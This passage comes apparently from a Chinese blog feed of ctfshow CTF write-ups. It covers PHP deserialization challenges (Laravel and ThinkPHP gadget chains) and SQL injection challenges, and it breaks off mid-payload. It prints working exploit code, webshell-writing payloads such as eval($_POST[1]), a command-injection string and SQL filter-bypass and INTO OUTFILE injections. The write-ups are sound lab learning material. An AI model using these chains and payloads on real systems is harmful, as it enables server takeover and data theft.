class_">Illuminate</span>\<span class="title class_">Bus</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">queueResolver</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$queueResolver</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;queueResolver = <span class="variable">$queueResolver</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Console</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">connection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$connection</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;connection = <span class="variable">$connection</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span>, <span class="variable">$event</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event = <span class="variable">$event</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title class_">line</span> = <span class="title class_">new</span> <span class="title class_">PhpParser</span>\<span class="title class_">Node</span>\<span class="title class_">Scalar</span>\<span class="title class_">MagicConst</span>\<span class="title class_">Line</span>();</span><br><span class="line">    <span class="variable">$mockdefinition</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Generator\MockDefinition</span>(<span class="variable">$line</span>,<span class="string">&quot;&lt;?php file_put_contents(&#x27;/app/public/1.php&#x27;,&#x27;&lt;?php eval(\$_POST[1]);?&gt;&#x27;);&quot;</span>);</span><br><span class="line">    <span class="variable">$evalloader</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Loader\EvalLoader</span>();</span><br><span class="line">    <span class="variable">$dispatcher</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Bus\Dispatcher</span>(<span class="keyword">array</span>(<span class="variable">$evalloader</span>,<span class="string">&#x27;load&#x27;</span>));</span><br><span class="line">    <span class="variable">$queuedcommand</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Console\QueuedCommand</span>(<span class="variable">$mockdefinition</span>);</span><br><span class="line">    <span class="variable">$pendingbroadcast</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Broadcasting\PendingBroadcast</span>(<span class="variable">$dispatcher</span>,<span class="variable">$queuedcommand</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingbroadcast</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里面为啥知道当前目录是/app/public/,可以用外带的方法，这里不用danlog了，用cookie.</p><p><img src="../images/image-20230107233821691.png" alt="image-20230107233821691"></p><p>修改一下这里，setcookie第一个参数是cookie的名字2，第二个参数是内容。</p><p><img src="../images/image-20230107234002112.png" alt="image-20230107234002112"></p><p>解码出来是<code>/app/public</code>，那么就可以往这个路径里边进行写码了。</p><p>上面的exp直接用就行了。</p><p><strong>这里加一个为什么要在木马里加转义字符的原因</strong></p><p><img src="../images/image-20230107234959347.png" alt="image-20230107234959347"></p><p><code>\$</code>表示的是$这个是有特殊用途的，不是简单的表示钱的意思。因为是在字符串里写的，识别不了，所以得加个转义字符<code>\</code></p><h2 id="web273"><a href="#web273" class="headerlink" title="web273"></a>web273</h2><p>源码</p><p>又是一道Laravel框架的题</p><p>用上一题的链子就可以了。</p><p>laravel用到的版本分别是  5.7和5.8的。</p><h2 id="web274"><a href="#web274" class="headerlink" title="web274"></a>web274</h2><p>源码</p><p><img src="../images/image-20230108000026004.png" alt="image-20230108000026004"></p><p>这次轮到thinkphp了。</p><p><img src="../images/image-20230108001823611.png" alt="image-20230108001823611"></p><p>发现反序列化入口，那么我们直接就上网去找payload就行了。</p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//GET传参 shell</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;shell&#x27;</span> =&gt; <span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&#x27;shell&#x27;</span> =&gt; []];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,</span><br><span class="line">        <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">        <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">        <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">        <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">        <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">        <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">        <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">        <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// HTTPS代理标识</span></span><br><span class="line">        <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// IP代理获取标识</span></span><br><span class="line">        <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">        <span class="comment">// URL伪静态后缀</span></span><br><span class="line">        <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [<span class="string">&#x27;var_pjax&#x27;</span> =&gt; <span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&#x27;visible&#x27;</span> =&gt; [<span class="variable language_">$this</span>,<span class="string">&#x27;isPjax&#x27;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230108001955291.png" alt="image-20230108001955291"></p><p><strong>GET  shell 传参。</strong></p><h2 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h2><p>源码</p><p><strong><img src="../images/image-20230108143551463.png" alt="image-20230108143551463"></strong></p><p>这题跟反序列话没啥太大关系，就是理清逻辑关系就可以成功拿到flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>目的就是为了使evilfile为true，然后执行这个函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">checkevil</span>()===<span class="literal">false</span>)&#123;</span><br><span class="line"><span class="comment">//写入文件内容</span></span><br><span class="line">      <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">      <span class="comment">//复制文件,生成的新文件名进行md5加密+随机数</span></span><br><span class="line">      <span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">      <span class="comment">//删除原来的文件</span></span><br><span class="line">      <span class="title function_ invoke__">unlink</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>知道这些以后，就可以成功进行rce了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;evilfile;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>只需要两个参数中含有对应的值就行了。</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="function"><span class="keyword">fn</span>=<span class="title">php</span></span>;tac f*</span><br></pre></td></tr></table></figure><h2 id="web276-phar反序列化"><a href="#web276-phar反序列化" class="headerlink" title="web276(phar反序列化)"></a>web276(phar反序列化)</h2><p>源码</p><p><img src="../images/image-20230113165336370.png" alt="image-20230113165336370"></p><h2 id="web277-python反序列化"><a href="#web277-python反序列化" class="headerlink" title="web277(python反序列化)"></a>web277(python反序列化)</h2><h2 id="web278-python反序列化"><a href="#web278-python反序列化" class="headerlink" title="web278(python反序列化)"></a>web278(python反序列化)</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;web254&quot;&gt;&lt;a href=&quot;#web254&quot; class=&quot;headerlink&quot; title=&quot;web254&quot;&gt;&lt;/a&gt;web254&lt;/h2&gt;&lt;p&gt;源码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230104214414714.</summary>
      
    
    
    
    
    <category term="ctfshow 反序列化" scheme="https://ke1nys.github.io/tags/ctfshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-sql注入 刷题记录</title>
    <link href="https://ke1nys.github.io/posts/b77a4eaf.html"/>
    <id>https://ke1nys.github.io/posts/b77a4eaf.html</id>
    <published>2022-12-26T08:28:29.000Z</published>
    <updated>2023-01-03T16:46:41.937Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p>源码</p><p><img src="../images/image-20221226192746294.png" alt="image-20221226192746294"></p><p>给了一个sql语句，那么我们就可以通过这sql语句来进行判断，那么我们可以自己新建一个数据库来测试。</p><p>就是利用phpstudy和navicat    （网上有教程，可以去拿来学习学习）</p><p><img src="../images/image-20221226193154082.png" alt="image-20221226193154082"></p><p>新建了一个和题目差不多的user表，然后就可进行测试。</p><p><img src="../images/image-20221226193548945.png" alt="image-20221226193548945"></p><p>通过这几个简单的测试，发现了就是虽然username不等于flag的情况下，可以利用id，就令前面的id=xx不成立的情况下，就可以用到后面的id了，那么我们就得以后面的id为突破口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; or id=&#x27;xxx     &#x27;&#x27;是为了闭合sql语句，否则无法执行</span><br></pre></td></tr></table></figure><p><strong>解法</strong></p><p>这道题的解法是看到只能查到id=24,我们就怀疑会不会藏在后面，我们就可以一个一个的试出来。</p><p><img src="../images/image-20221226193930975.png" alt="image-20221226193930975"></p><h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>源码</p><p><img src="../images/image-20221226203357870.png" alt="image-20221226203357870"></p><p><img src="../images/image-20221226203412925.png" alt="image-20221226203412925"></p><p>这道题直接用上一道题的解法，这道题就解不了了那么可以换别的解法，就是union联合注入。</p><p>就是可以本地试一下，如果成功了话，就可以拿去题目试一下</p><p><img src="../images/image-20221226204544643.png" alt="image-20221226204544643"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select id,password from user where username=&#x27;flag</span><br></pre></td></tr></table></figure><p>这里查询列的数量要和题目给的语句中列的数量一样</p><p>这句话成功执行了，那么我们就可以拿去题目试一下，发现也可以成功执行，就拿到flag了。</p><p><img src="../images/image-20221226204645887.png" alt="image-20221226204645887"></p><p><strong>也可以利用模糊查询，但是只能本地通过，题目不能通过。</strong></p><p><img src="../images/image-20221226205245342.png" alt="image-20221226205245342"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; or username like &#x27;%f%</span><br></pre></td></tr></table></figure><p><strong>补充点知识</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql  中的点是 &#x27; . &#x27;  可以这样用，再有多个数据库的情况下， </span><br><span class="line">数据库名.xxxxx    例如这道题就可以这样用  ctfshow_user2.username   ctfshow_user2.id</span><br><span class="line">ctfshow_user2.password</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">也可以把数据库设做别的名字。   利用的是   as  这个单词</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select b.id,b.password from user as b where b.username=&#x27;flag</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select id,password from ctfshow_user2 where username=&#x27;flag</span><br></pre></td></tr></table></figure><h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>源码</p><p><img src="../images/image-20221226210521949.png" alt="image-20221226210521949"></p><p>这道题是结果返回的过程中不能出现flag,那么我们就得想办法把flag给绕过，那么我们就可以通过转换进制来绕过。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select id,bin(username),password from ctfshow_user3 where username=&#x27;flag</span><br></pre></td></tr></table></figure><p>也可以换成hex   —&gt;16进制。</p><p><img src="../images/image-20221226211348202.png" alt="image-20221226211348202"></p><p>那么就可以成功拿到flag了。</p><p>最好是本地测试通过后在搬到题目上</p><p><img src="../images/image-20221226211450157.png" alt="image-20221226211450157"></p><h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>源码</p><p><img src="../images/image-20221226225822637.png" alt="image-20221226225822637"></p><p>利用前面的语句已经解不出来了，因为就是把flag和数字都屏蔽掉了，因为flag中还含有数字，所以就得使用替换。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9999&#x27;union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(password),&#x27;1&#x27;,&#x27;nba&#x27;),&#x27;2&#x27;,&#x27;nbb&#x27;),&#x27;3&#x27;,&#x27;nbc&#x27;),&#x27;4&#x27;,&#x27;nbd&#x27;),&#x27;5&#x27;,&#x27;nbe&#x27;),&#x27;6&#x27;,&#x27;nbf&#x27;),&#x27;7&#x27;,&#x27;nbg&#x27;),&#x27;8&#x27;,&#x27;nbh&#x27;),&#x27;9&#x27;,&#x27;nbi&#x27;),&#x27;0&#x27;,&#x27;nbj&#x27;),&#x27;a&#x27; from ctfshow_user4 where username=&#x27;flag&#x27;--+</span><br></pre></td></tr></table></figure><p>—+指的是注释</p><p>这个py的意思就是把flag中的数字全部替换成别的，用16进制转换的原因是，因为转换的字母全是大写，所以我们替换的是小写，那么就不会出现影响。</p><p><strong>替换回去的py脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nb=<span class="string">&#x27;ctfshow&#123;nbfnbcnbgnbdnbfnbfnbgnbcnbfnbhnbfFnbgnbgnbgBnbcnbenbcnbanbcnbbnbfnbcnbfnbfnbfnbcnbcnbenbfnbfnbbDnbfnbanbfnbcnbcnbanbcnbhnbbDnbcnbdnbcnbbnbfnbanbcnbanbbDnbfnbbnbcnbgnbcnbcnbcnbcnbbDnbfnbdnbfnbbnbfnbcnbfnbbnbcnbdnbcnbfnbcnbjnbcnbanbcnbdnbcnbbnbfnbfnbcnbjnbgD&#125;&#x27;</span></span><br><span class="line"><span class="comment">#nb表示number</span></span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nba&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbb&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbc&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbd&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbe&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbf&#x27;</span>,<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbg&#x27;</span>,<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbh&#x27;</span>,<span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbi&#x27;</span>,<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbj&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(nb)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221226232256106.png" alt="image-20221226232256106"></p><p>这里去输入a是为了把flag名给替换掉。</p><p>输入payload，拿到转换后的flag，放到脚本里</p><p><img src="../images/image-20221226232824965.png" alt="image-20221226232824965"></p><p>得到输出结果后，进行16进制转换。</p><p><img src="../images/image-20221226233028450.png" alt="image-20221226233028450"></p><h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><p>源码</p><p><img src="../images/image-20221226234423628.png" alt="image-20221226234423628"></p><p>这里去查了一下ascii表，发现是全部都给过滤掉了，太致命了。所以看了群主的视频，学到了一种方法</p><p>就是利用这个东西</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,&quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile&#x27;/var/www/html/1.php</span><br></pre></td></tr></table></figure><p>然后就去连接蚁剑，连接蚁剑完后就去连接数据库就好了。</p><p>（但是我连接数据库失败，不知道是啥原因）</p><h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><p>源码</p><p><img src="../images/image-20221227153245178.png" alt="image-20221227153245178"></p><p>就是增加了过滤，但是这里也没给过滤了啥，所以可以拿简单的代码试试，看能不能打通。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; or id=&#x27;26     -1&#x27; or username=&#x27;flag</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221227153414750.png" alt="image-20221227153414750"></p><p>成功拿到flag。</p><h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><p>源码</p><p><img src="../images/image-20221227154121948.png" alt="image-20221227154121948"></p><p>这道题简单进行了测试，发现的是对空格进行了过滤。</p><p><strong>空格被过滤的替换方法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首先我们空格被过滤，这个绕过方法有很多</span><br><span class="line">使用注释绕过，/**/，但是因为’/‘被过滤，导致此方法无法使用</span><br><span class="line">使用括号绕过，括号可以用来包围子查询，任何计算结果的语句都可以使用（）包围，并且两端可以没有多余的空格</span><br><span class="line">使用符号替代空格 %20 %09 %0d %0b %0c %0d %a0 %0a，这里我选择了%0a进行绕过</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221227154738181.png" alt="image-20221227154738181"></p><p>通过测试，确实是空格被过滤了，那么我们就可以选择2为注释点。</p><p><img src="../images/image-20221227154904901.png" alt="image-20221227154904901"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/&#x27;1&#x27;,(select/**/password/**/from/**/ctfshow_user/**/where/**/username=&#x27;flag&#x27;),&#x27;3&#x27;;%23</span><br></pre></td></tr></table></figure><p>直接用#不行，得进行url编码。</p><h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><p>源码</p><p><img src="../images/image-20221227155020058.png" alt="image-20221227155020058"></p><p>这道题是把/**给过滤掉了，然后换成%0b就行。</p><p><img src="../images/image-20221227155457926.png" alt="image-20221227155457926"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;%0bunion%0bselect%0b&#x27;1&#x27;,(select%0bpassword%0bfrom%0bctfshow_user%0bwhere%0busername=&#x27;flag&#x27;),&#x27;3&#x27;;%23</span><br></pre></td></tr></table></figure><h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><p>源码</p><p><img src="../images/image-20221227155714933.png" alt="image-20221227155714933"></p><p>这道题进行了测试下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/**/  %0a  %0b 都过滤掉了</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221227155823003.png" alt="image-20221227155823003"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 